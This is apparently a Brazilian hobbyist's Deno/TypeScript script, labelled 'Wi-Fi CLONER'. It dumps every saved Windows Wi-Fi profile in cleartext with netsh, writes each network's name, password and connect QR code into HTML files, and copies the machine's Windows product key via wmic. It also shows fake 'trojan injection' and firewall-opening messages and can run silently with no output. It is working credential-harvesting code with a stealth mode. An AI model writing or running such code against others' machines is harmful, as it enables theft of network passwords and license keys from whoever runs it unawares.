import { SpinnerTypes, TerminalSpinner } from '@spinners';
import { keypress } from '@cliffy/keypress';
import { DateTime } from '@luxon';
import { qrcode } from '@qrcode';
import { delay } from '@std';
import colors from '@colors';
import $ from '@dax';

// Logs e delays ativados
let showLogs = Deno.args.includes('-q') ? false : true;
let winLKey: string;
let counter = 0;
colors;

// Função intermediária para delay();
const sleep = (timeout: number) => showLogs ? delay(timeout) : null;
const random = (min = 500, max = 2_500) =>
	Math.floor(Math.random() * (max - min) + min);

const getTimestamp = () =>
	DateTime.now()
		.setLocale('pt')
		.setZone('America/Sao_Paulo');

//  Ativa o Listener para o teclado
silentMode();

// Se não existir, nem Title terá
await Deno.mkdir('data').catch(() => {});

// Title.txt contém uma string colorida bem cringe
const title: string = await Deno.readTextFile('data/Title.txt')
	.catch(() => '');
showLogs && console.log('%c' + title, 'color: red');

class Spinner {
	sector: string;
	text: string;
	spinner: TerminalSpinner | undefined;

	constructor(sector: string, text: string) {
		this.sector = sector;
		this.text = text;

		// Inicia Spinner
		showLogs &&
			(this.spinner = new TerminalSpinner({
				text: this._format(),
				spinner: {
					interval: 40,
					frames: SpinnerTypes.dots.frames,
				},
				indent: 1,
				color: 'green',
			}).start());
	}

	end(msg: string) {
		this.text = msg;
		this.spinner?.succeed(this._format(1));
	}

	fail(msg: string) {
		this.text = msg;
		this.spinner?.fail(this._format(1));
	}

	_format(status = 0) {
		return [ // Modelo de string
			'[',
			this.sector.toUpperCase().green, // [ SECTOR
			'|',
			getTimestamp().toFormat('T').yellow, // [ SECTOR | 18:04
			'] -',
			status ? this.text.red : this.text.cyan,
		].join(' '); // [ SETOR | 18:04 ] - TEXT
	}
}

// "injetar trojan" vulgo acessar uma API nativa do Windows
await NetSHProfileCollector();

// Copiar key do Windows
await copyWinKey();

// Limpar registros de arquivos
await Deno.remove('temp', { recursive: true })
	.catch(() => {});
// 'recursive' significa que é pra apagar mesmo se tiver arquivos dentro

!showLogs && Deno.exit();

async function NetSHProfileCollector() {
	createFakeLogs();
	// sem await pra exibir os logs enquanto copia os dados

	// Cria pasta de arquivos temporários (se não existir)
	await Deno.mkdir('temp').catch(() => {});

	// Cria pasta de senhas (se não existir)
	await Deno.mkdir('data/WiFiPasswords').catch(() => {});

	// Chama a API do Windows
	await $`netsh wlan export profile key=clear folder=temp`.lines();

	for await (const file of Deno.readDir('temp')) {
		/** Por padrão, A API fornece as informações em arquivos XML bem poluídos
		 * Então eu fiz essa bosta aqui pra deixar só o que é realmente importante
		 */
		counter++;

		// Lendo o conteúdo do arquivo
		const content = await Deno.readTextFile(`temp/${file.name}`);

		// Filtrando as tags que são úteis
		const [SSID, , auth, pswd] = clearTags(content.matchAll(
			/<(name|authentication|keyMaterial)>.*?<\/.*>/g,
		));

		// Gerando QR Code para conectar
		const networkQR = await qrcode(
			`WIFI:S:${SSID};T:${auth};P:${pswd};H:false;;`,
			{ size: 256 },
		);

		// Escrevendo arquivos com as informações filtradas no diretório final
		const networkData = `
<!DOCTYPE html>
<html lang="pt-BR">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>${SSID[0]}</title>
</head>
<body>
	<div>
		SSID: ${SSID[1]}<br>
		Data: ${
			getTimestamp().toFormat('DDDD')
		} (<timestamp>${getTimestamp().ts}</timestamp>)<br>
		Autenticação: ${auth[1]}<br>
		Senha: ${pswd[1]}
	</div><br><br>
	<img src="${networkQR}">
</body>
</html>`;

		await Deno.writeTextFile(
			`data/WiFiPasswords/${SSID[0]}.html`,
			networkData,
		);
	}
}

async function copyWinKey() {
	winLKey =
		(await $`wmic path softwarelicensingservice get OA3xOriginalProductKey`
			.lines())[1];

	// Cria pasta de chaves do Windows (se não existir)
	await Deno.mkdir('data/WindowsKeys').catch(() => {});

	await Deno.writeTextFile(
		`data/WindowsKeys/${Deno.hostname()}.txt`,
		`Máquina: ${Deno.hostname()}\nData: ${
			getTimestamp().toFormat('DDDD')
		}\nChave de ativação do Windows: ${winLKey}`,
	);
}

async function createFakeLogs() {
	let spinner;
	const fakeLogs = [
		['Injetando Trojan na API do NetSH...', 'Script injetado.'],
		['Modificando permissões do Windows...', 'Permissões concedidas.'],
		[
			'Abrindo porta no FireWall...',
			'FireWall desbloqueado na porta 8080.',
		],
	];

	// Exibe status fakes pra impressionar leigos
	for (const msg of fakeLogs) {
		spinner = new Spinner('Wi-Fi CLONER', msg[0]);
		await sleep(random());
		spinner.end(msg[1]);
	}

	spinner = new Spinner('Wi-Fi CLONER', 'Clonando redes Wi-Fi...');
	await sleep(random(1_000, 3_000));
	spinner.end(`${counter} redes clonadas.`);

	spinner = new Spinner('KEY CLONER', 'Obtendo chave de ativação...');
	await sleep(random());
	spinner.end(`Chave de ativação obtida: ${winLKey}`);

	spinner = new Spinner('CLEANER', 'Apagando registros...');
	await sleep(random());
	spinner.end('Registros excluídos.');

	showLogs && Deno.exit();
}

function clearTags(matches: IterableIterator<RegExpMatchArray>) {
	// Regex pra filtrar as tags do XML
	const networks: string[][] = [];

	for (const match of matches) {
		networks.push([
			String(match[0]).replace(/<.*?>/g, ''), // nome da rede
			match[0], // tag HTML da rede
		]);
	}

	return networks;
}

async function silentMode() {
	for await (const event of keypress()) {
		if (event.key === 'escape') Deno.exit();

		// quando a tecla S for pressionada
		if (event.key === 's') showLogs = false;
		// ativa o silent mode
	}
}
